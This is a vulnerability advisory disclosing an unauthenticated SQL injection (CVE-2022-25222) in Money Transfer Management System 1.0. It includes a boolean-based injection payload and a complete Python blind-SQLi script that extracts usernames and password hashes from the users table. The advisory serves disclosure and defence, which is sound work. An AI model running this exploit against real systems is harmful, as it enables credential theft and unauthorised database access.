---
slug: advisories/berry/
title: Money Transfer Management System 1.0 - Unauthenticated SQLi
authors: Oscar Uribe
writer: ouribe
codename: berry
product: Money Transfer Management System 1.0
date: 2022-03-15 12:00 COT
cveid: CVE-2022-25222
description: Money Transfer Management System 1.0 - Unauthenticated SQL Injection
keywords: Fluid Attacks, Security, Vulnerabilities, MTMS, SQL
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                         |                                                                  |
|-------------------------|------------------------------------------------------------------|
| **Name**                | Money Transfer Management System - Unauthenticated SQL Injection |
| **Code name**           | [Berry](https://en.wikipedia.org/wiki/Chuck_Berry)               |
| **Product**             | Money Transfer Management System                                 |
| **Affected versions**   | Version 1.0                                                      |
| **State**               | Public                                                           |
| **Release date**        | 2022-03-15                                                       |

## Vulnerability

|                       |                                                                                 |
|-----------------------|---------------------------------------------------------------------------------|
| **Kind**              | SQL injection                                                                   |
| **Rule**              | [146. SQL injection](https://docs.fluidattacks.com/criteria/vulnerabilities/146)|
| **Remote**            | Yes                                                                             |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                                    |
| **CVSSv3 Base Score** | 7.5                                                                             |
| **Exploit available** | Yes                                                                             |
| **CVE ID(s)**         | [CVE-2022-25222](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25222)                                                                                      |

## Description

Money Transfer Management System **Version 1.0** allows an unauthenticated
user to inject SQL queries in `admin/maintenance/manage_branch.php`
and `admin/maintenance/manage_fee.php` via the id parameter.

## Proof of Concept

Steps to reproduce

1. Go to `http://127.0.0.1/mtms/admin/maintenance/manage_branch.php`

2. Insert the following query inside the id parameter.

```sql
?id=1' and 1=1 -- -
```

3. The server response changes if the second part of the query is true or false.
   To automate the process use the below exploit.

System Information

* Version: Money Transfer Management System version 1.0.
* Operating System: Linux.
* Web Server: Apache
* PHP Version: 7.4
* Database and version: MySQL

## Exploit

```python
import requests
import urllib.parse

dictionary = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ !"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"""

def sqli_bool(base_url,query):


    url = "?id=1' and %s -- -" % query

    #proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
    #r = requests.get(base_url+url, proxies=proxies)
    r = requests.get(base_url+url)

    if len(r.text) > 2700:
        return True

    else:
        return False


def get_length(url, query):

    for i in range(0,200):
        current_query = "(length((%s))=%s)"%(query,str(i))
        current_query = current_query=urllib.parse.quote(current_query)
        if sqli_bool(url,current_query):
            break

    if i !=199:
        return i
    else:
        return -1


def make_query(url,query):

    # Get length
    length = get_length(url,query)

    print("[*] Getting output length:")
    if length == -1:
        print("Error getting query length")
        return 0
    print("[+] Output Lenght: " + str(length))

    current_result = ""

    print()
    print("[*] Getting output: ")

    for pos in range(length+1):
        for char in dictionary:

            current_query = '(substr((%s),%s,1)="%s")' %(query,str(pos),requests.utils.quote(char))
            if sqli_bool(url,current_query):
                current_result += char
                print(current_result, end='\r')
                break

    print("[+] Found: " + " " * 100)
    print(current_result)


url = "http://127.0.0.1/mtms/admin/maintenance/manage_branch.php"

# must be only 1 row
# use limit and offset to iterate

# CHANGE THIS
query = "select concat(username,':', password) as t1 from users limit 1"

make_query(url,query)
```

## Mitigation

By 2022-03-15 there is not a patch resolving the issue.

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of  `Fluid Attacks`.

## References

|                     |                                                                     |
|---------------------|---------------------------------------------------------------------|
| **Vendor page**     | <https://www.sourcecodester.com/php/15015/money-transfer-management-system-send-money-businesses-php-free-source-code.html>           |

## Timeline

* 2022-02-15: Vulnerability discovered.

* 2022-02-15: Vendor contacted.

* 2022-03-15: Public Disclosure.
